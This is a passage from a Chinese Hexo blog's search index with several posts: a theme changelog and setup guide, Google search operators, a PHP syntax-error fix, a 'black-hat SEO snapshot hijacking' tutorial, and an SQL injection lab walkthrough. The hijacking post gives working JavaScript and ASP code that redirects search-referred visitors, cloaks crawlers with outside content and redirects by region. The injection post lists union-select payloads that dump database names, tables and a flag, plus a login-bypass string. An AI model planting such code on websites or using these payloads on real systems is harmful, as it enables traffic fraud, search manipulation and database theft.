2019.09.01</p></li><li><p>添加页面樱花飘落动效            2019.09.09</p></li><li><p>添加鼠标点击烟花爆炸动效   2019.09.09</p></li><li><p>加入天气接口控件   2019.09.09</p></li><li><p>加入鼠标点击文字特效   2019.09.10</p></li><li><p>添加页面雪花飘落动效            2019.09.10</p></li><li><p>添加在线聊天插件            2019.09.12</p></li><li><p>持续更新…</p></li></ul><hr><p><strong>简单使用方法：</strong></p><ol><li><code>star</code> 本项目</li><li>安装<a href="https://git-scm.com/downloads" target="_blank" rel="noopener">Git</a>, 安装<a href="https://nodejs.org/en/" target="_blank" rel="noopener">nodeJS</a></li><li>你可以直接<code>fork</code>一份源码到你的仓库，<code>clone</code>到本地</li><li>在本地博客仓库运行<code>npm i</code>命令安装依赖包</li><li>修改配置信息，改成自己的信息</li><li>运行命令<code>hexo  clean</code>（清除生成文件），<code>hexo g</code>（生成网页）， <code>hexo  s</code>（本地预览），<code>hexo d</code>（部署）</li></ol><blockquote><p><strong>更多详情教程，强烈推荐看洪卫写的：<a href="https://sunhwee.com/posts/6e8839eb.html" target="_blank" rel="noopener">Hexo+Github博客搭建完全教程</a></strong></p></blockquote><blockquote><p><strong>最后，如果项目和教程对你有所帮助或者你看见了还算比较喜欢，欢迎给我<code>star</code>，谢谢您！</strong></p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 软件安装与配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> Github </tag>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见的搜索命令</title>
      <link href="/2019/08/24/chang-jian-de-sou-suo-ming-ling/"/>
      <url>/2019/08/24/chang-jian-de-sou-suo-ming-ling/</url>
      
        <content type="html"><![CDATA[<h3 id="1）逻辑与-或：AND、OR"><a href="#1）逻辑与-或：AND、OR" class="headerlink" title="1）逻辑与/或：AND、OR"></a>1）逻辑与/或：AND、OR</h3><p>注意AND、OR必须大写，否则会被认为是普通的单词，而不是搜索指令。<br>与普通编程语言不一样的是，OR指令优先于AND指令。<br>简写：AND指令一般以空格代替，不明确写出。另外AND指令还可以用+代替。OR指令可用|代替。<br>样例：Inverted OR Signature files OR file OR index，它等同于 (Inverted OR Signature) (files OR file OR index)</p><h3 id="2）逻辑非："><a href="#2）逻辑非：" class="headerlink" title="2）逻辑非：-"></a>2）逻辑非：-</h3><p>样例：搜索引擎 历史 -文化 -中国历史 -世界历史</p><h3 id="3）完整匹配：”…”"><a href="#3）完整匹配：”…”" class="headerlink" title="3）完整匹配：”…”"></a>3）完整匹配：”…”</h3><p>样例：”world war I” 表示搜索一次世界大战。</p><h3 id="4）通配符："><a href="#4）通配符：" class="headerlink" title="4）通配符：*?"></a>4）通配符：*?</h3><p>与我们通常的习惯一致，“*”代表一连串字符，“?”代表单个字符。<br>样例：progr?m<br>提示：不要指望Google可用通过progr?m搜索到program，因为progr和m分别被当作一个独立的单词，并且这两个单词之间允许出现一个字符，如此而已。</p><h3 id="5）site-在某个网站或域名下搜索"><a href="#5）site-在某个网站或域名下搜索" class="headerlink" title="5）site: 在某个网站或域名下搜索"></a>5）site: 在某个网站或域名下搜索</h3><p>样例：搜索引擎 技巧 site:edu.cn<br>这表示要在中文教育科研网站（edu.cn）上关于搜索引擎技巧的页面。</p><h3 id="6）filetype-搜索某种类型的文件"><a href="#6）filetype-搜索某种类型的文件" class="headerlink" title="6）filetype: 搜索某种类型的文件"></a>6）filetype: 搜索某种类型的文件</h3><p>样例：filetype:pdf<br>这表示只搜索pdf文件。</p><h3 id="7）in指令-位置关键词查找。"><a href="#7）in指令-位置关键词查找。" class="headerlink" title="7）in指令: 位置关键词查找。"></a>7）in指令: 位置关键词查找。</h3><p>intitle: 在网页标题中查找。这通常对讨论比较多的热门话题很有效。例如：intitle:”GeForce 7800”+测试</p><p>allintitle: 该指令属于排他指令，不能与其他指令混用。</p><blockquote><p>例如：allintitile:”GeForce 7800” 测试 与 intitle:”GeForce 7800”+测试 的含义一致。但是，allintitile是排他的，不能加上其他非intitle方面的限制条件。<br>注意：在这里，你会发现用+代替AND指令是很有意思的。如果没有+指令，我们就需要写：intitle:”GeForce 7800” intitle:测试，因为Google不支持这样的写法：intitle:(“GeForce 7800” 测试)</p></blockquote><h6 id="inurl-在网页的url地址中查找。"><a href="#inurl-在网页的url地址中查找。" class="headerlink" title="inurl: 在网页的url地址中查找。"></a>inurl: 在网页的url地址中查找。</h6><p>例如：</p><p>inurl:dowload 表示查找url中包含download的网页。</p><p>inurl：/_whatsnew.html表示查找url中包含/whatsnew.html的网页。</p><p>allinurl: inurl的排他指令。<br>inanchor: 在网页的链接锚中查找。</p><blockquote><p>需要注意区别于inurl：inurl是网页本身的url地址，而inanchor是在外部用于指向该url地址的文本（<a>…</a>之间文本）中找。<br>例如：inanchor:download，你可能会发现有FlashGet最佳的下载管理程式，而该页面中根本就没有download字样。</p></blockquote><p>allinanchor: inanchor的排他指令。<br>intext: 在正文中检索。intext:FCKeditor<br>allintext: intext的排他指令。</p><h3 id="8）link-搜索所有链接到某个URL地址的网页"><a href="#8）link-搜索所有链接到某个URL地址的网页" class="headerlink" title="8）link: 搜索所有链接到某个URL地址的网页"></a>8）link: 搜索所有链接到某个URL地址的网页</h3><p>最重要的用途：迅速判断一个网页的“热度”。<br>例如：link:<a href="http://www.newhua.com" target="_blank" rel="noopener">www.newhua.com</a> 表示所有指向“华军软件园”外部链接。<br>注意：和其他指令类似，link:和url之间不能有空格。之所以特别指出这一点，是因为网上有教程说link和allinurl等一样，是排他指令，中间可以有空格。我不太了解Google搜索指令的发展历史，只能猜测曾经如此。</p><h3 id="9）related-寻找某网页的“类似网页”。"><a href="#9）related-寻找某网页的“类似网页”。" class="headerlink" title="9）related: 寻找某网页的“类似网页”。"></a>9）related: 寻找某网页的“类似网页”。</h3><p>例如：related:<a href="http://www.newhua.com" target="_blank" rel="noopener">www.newhua.com</a> 表示找和“华军软件园”类似的网页。<br>这条指令其实Google自己用得很广泛，只是可能没有引起你的注意罢了。在Google的每条搜索结果中，均有一个“类似网页”的链接。就是它了。</p><h3 id="10）cache-网页快照（略）。"><a href="#10）cache-网页快照（略）。" class="headerlink" title="10）cache: 网页快照（略）。"></a>10）cache: 网页快照（略）。</h3><h3 id="11）daterange-据说可以限定网页的更新时间。但是我没有试出来。"><a href="#11）daterange-据说可以限定网页的更新时间。但是我没有试出来。" class="headerlink" title="11）daterange: 据说可以限定网页的更新时间。但是我没有试出来。"></a>11）daterange: 据说可以限定网页的更新时间。但是我没有试出来。</h3><h3 id="12）数值范围："><a href="#12）数值范围：" class="headerlink" title="12）数值范围： .."></a>12）数值范围： ..</h3><p>例如：数码相机 600..900 万像素 3000..4000 元<br>注意：“900”与“万”之间必须有空格。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 搜索指令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>黑帽seo基础手法之快照劫持</title>
      <link href="/2019/08/06/hei-mao-seo-ji-chu-shou-fa-zhi-kuai-zhao-jie-chi/"/>
      <url>/2019/08/06/hei-mao-seo-ji-chu-shou-fa-zhi-kuai-zhao-jie-chi/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00劫持流量："><a href="#0x00劫持流量：" class="headerlink" title="0x00劫持流量："></a>0x00劫持流量：</h1><p>从百度来的时候才会跳转，正常输入网址是打开正常的。好，我们先看一下是怎么实现的，上代码：</p><pre><code>&lt;script LANGUAGE="Javascript"&gt;var s=document.referrerif(s.indexOf("google")&gt;0 || s.indexOf("baidu")&gt;0 || s.indexOf("yahoo")&gt;0 ) location.href="http://222.com";elselocation.href="indax.php/index.asp/index.html"&lt;/script&gt;</code></pre><p>代码解释：if(s.indexOf(“google”)&gt;0 || s.indexOf(“baidu”)&gt;0 || s.indexOf(“yahoo”)&gt;0 ) 判断搜索引擎来源，如果来源正确，location.href=”http:222.cn”;跳转到222.cn网站。下面的代码是如果否，则打开正常首页。这段代码为js代码。只是一个简单的判断。</p><p>遗留问题：如果返回本页面将会被不断刷新。</p><h1 id="0x01快照劫持"><a href="#0x01快照劫持" class="headerlink" title="0x01快照劫持:"></a>0x01快照劫持:</h1><pre><code>&lt;%@ LANGUAGE = VBScript.Encode %&gt;&lt;% Dim agentagent=Request.ServerVariables("http_user_agent")If instr(agent,"Baiduspider") &gt; 0 or instr(agent,"baidubrowser") &gt; 0 or instr(agent,"Sogou") &gt; 0 or instr(agent,"googlebot") &gt; 0 or instr(agent,"Sosospider") &gt; 0 thenlinkurl="http://www.xxx.com" *快照网址Function GetBody(Url) Dim objXMLOn Error Resume NextSet objXML = CreateObject("Microsoft.XMLHTTP") With objXML .Open "Get", Url, False, "", "" .Send GetBody = .ResponseBodyEnd With GetBody=BytesToBstr(GetBody,"GB2312")Set objXML = Nothing End FunctionFunction BytesToBstr(strBody,CodeBase)dim objStreamset objStream = Server.CreateObject("Adodb.Stream")objStream.Type = 1objStream.Mode =3objStream.OpenobjStream.Write strBodyobjStream.Position = 0objStream.Type = 2objStream.Charset = CodeBaseBytesToBstr = objStream.ReadText objStream.Closeset objStream = nothingEnd Functionresponse.write GetBody(linkurl)End if%&gt;&lt;script LANGUAGE="Javascript"&gt;var s=document.referrerif(s.indexOf("google")&gt;0 || s.indexOf("baidu")&gt;0 || s.indexOf("yahoo")&gt;0 ) location.href="http://www.baidu.com";&lt;/script&gt;</code></pre><p>代码解释：前一段判断抓取蜘蛛来源，指向快照抓取网址；后一段代码判断来路，进行跳转到指定网址。</p><h1 id="0x02判断地区劫持流量"><a href="#0x02判断地区劫持流量" class="headerlink" title="0x02判断地区劫持流量"></a>0x02判断地区劫持流量</h1><pre><code>&lt;script src="http://int.dpool.sina.com.cn/iplookup/iplookup.php?format=js" charset="GB2312" &gt;&lt;/script&gt;&lt;script type=text/javascript&gt;if(remote_ip_info.province ==*江西*){这里指定地区;这里为空表示不跳转 我们留空表示不跳转}else{否则window.location.href="http://www.hao123.com";如果不是上面地区 就跳转到这个网址}&lt;/script&gt;</code></pre><p>代码解释：<a href="http://jump.bdimg.com/safecheck/index?url=x+Z5mMbGPAvk6+JNbA1HNpKFG1T6KGRDoRZ4YeV5S2M/4vme41q3RQmWqvBEJ59vI2McI+EnbtyrcR+Yjp/Z9HaORwFgo+pdy9TaY1Lx6gfGd7EmJd5rLKNTy/pwAFXHgfkHsNvKnKnClD2N0XkhGdm3LnaG/PmJbLQUTrDjOtdMLRYrBhSOWK65kGbZxUDZdj2oeHoEzTI=" target="_blank" rel="noopener">http://int.dpool.sina.com.cn/iplookup/iplookup.php?format=js</a> 为ip数据识别；其他代码看注释；</p><h1 id="0x03跳转代码参考："><a href="#0x03跳转代码参考：" class="headerlink" title="0x03跳转代码参考："></a>0x03跳转代码参考：</h1><h3 id="1-php文件"><a href="#1-php文件" class="headerlink" title="1.php文件"></a>1.php文件</h3><pre><code>&lt;?php if(file_exists('3.php')){   include('111.php');}else{ include('222.php');}</code></pre><p>代码解释：判断有无3.php，返回true或falst，如果true就到111.php，反之到222.php。</p><h3 id="2-html文件"><a href="#2-html文件" class="headerlink" title="2.html文件"></a>2.html文件</h3><pre><code>&lt;form style='display:none;' id='form1' name='form1' method='post' action=''&gt;&lt;input name='apikey' type='text' value='1990225' /&gt;&lt;/form&gt;&lt;script type="text/javascript"&gt;document.form1.action = "/3.php";document.form1.submit()&lt;/script&gt;</code></pre><p>代码解释：打开直接跳转到3.php。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 劫持 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 跳转 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php报错： Parse error: syntax error, unexpected end of file in</title>
      <link href="/2019/08/03/php-bao-cuo-parse-error-syntax-error-unexpected-end-of-file-in/"/>
      <url>/2019/08/03/php-bao-cuo-parse-error-syntax-error-unexpected-end-of-file-in/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><strong>Parse error: syntax error, unexpected end of file in。</strong>一开始出现这种错误，以为是编码的问题一直在转换编码，反复检查和数据库编码一样还是出现这种错误。终于在百度上get到了。</p><h2 id="00x0错误原因"><a href="#00x0错误原因" class="headerlink" title="00x0错误原因"></a>00x0错误原因</h2><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/img/0dd7912397dda144d4e0b72eb7b7d0a20df48645.jpg" alt="错误示例1"></p><h6 id="你应避免这样的写法-这样写"><a href="#你应避免这样的写法-这样写" class="headerlink" title="你应避免这样的写法, 这样写:"></a>你应避免这样的写法, 这样写:</h6><pre><code>&lt;?php if (condition): ?&gt;&lt;div&gt;你的html代码&lt;/div&gt;&lt;?php else: ?&gt;&lt;div&gt;你的html代码&lt;/div&gt;&lt;?php endif ?&gt;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/img/e1fe9925bc315c609c7db07388b1cb1348547746.jpg" alt="错误示例2"></p><h6 id="你也要避免以下写法"><a href="#你也要避免以下写法" class="headerlink" title="你也要避免以下写法:"></a>你也要避免以下写法:</h6><p><code>{?&gt;</code><br><code>&lt;?php}</code></p><h2 id="0x01解决"><a href="#0x01解决" class="headerlink" title="0x01解决"></a>0x01解决</h2><p>如果你使用了标签, 那在你的 php.ini 里的这一项, 把 <code>off</code> 改成 <code>on</code></p><blockquote><p>short_open_tag = Off</p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 报错问题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 报错 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>报错注入</title>
      <link href="/2019/07/30/bao-cuo-zhu-ru/"/>
      <url>/2019/07/30/bao-cuo-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote><p>环境：Apache2.4.39</p><p>数据库：MySQL8.0.12</p></blockquote><p>源码：Webug4.0</p><p>工具：Phpstudy</p><h2 id="0x00测试过程"><a href="#0x00测试过程" class="headerlink" title="0x00测试过程"></a>0x00测试过程</h2><ul><li><p>?id=1          //测试url是否可控。</p></li><li><p>?id=1’         //加单引号报错</p></li><li><p>?id=1’ or 1=1 –+         //注释掉后面的内容可用–+或#浏览器编码为%23</p></li><li><p>?id=1’ order by 1 %23     //利用order by判断字段个数（从1开始尝试，发现3页面报错，因此半段字段个数为2个，接下来查看数据库的名字）</p></li><li><p>?id=1’ union select 1,group_concat(schema_name) from information_schema.schemata%23     //查看数据库的名字</p></li><li><p>?id=1’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=’webug’ %23     //查看webug这个数据库的表</p></li><li><p>?id=1’ union select 1,group_concat(column_name) from information_schema.columns where table_name=’flag’ %23      //查看flag这个表</p></li><li><p>?id=1’ union select 1,flag from webug.flag %23    //查看一下flag字段</p></li></ul><h2 id="0x02get到了"><a href="#0x02get到了" class="headerlink" title="0x02get到了"></a>0x02get到了</h2><ol><li>concat(str1,str2,…)    返回结果为参数间无间隔符连接起来的字符串，如果其中有一个参数为NULL，返回结果为NULL</li><li>concat_ws(separator, str1, str2, …)    含有分隔符地连接字符串，第一个参数为制定的分隔符</li><li>group_concat(str1,str2,…) 　　连接一个组的所有字符串，并以逗号分隔每一条数据</li><li>union 用于合并两个或多个select语句的结果集，需要注意的是union内部的select须拥有相同数量的列，且列的数据类型也要相同。</li><li>逻辑顺序 true and false or true    结果为true   这样可以构造万能密码 Select * from admin where username=’admin’ and password=’’or 1=1#’</li><li>注释掉后面内容时可用 –+ 或者 # 后者在浏览器中会进行url编码为%23</li><li>注入的一般流程为：输入点–&gt;数据库–&gt;数据表–&gt;数据列–&gt;数据项</li></ol><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> sql注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
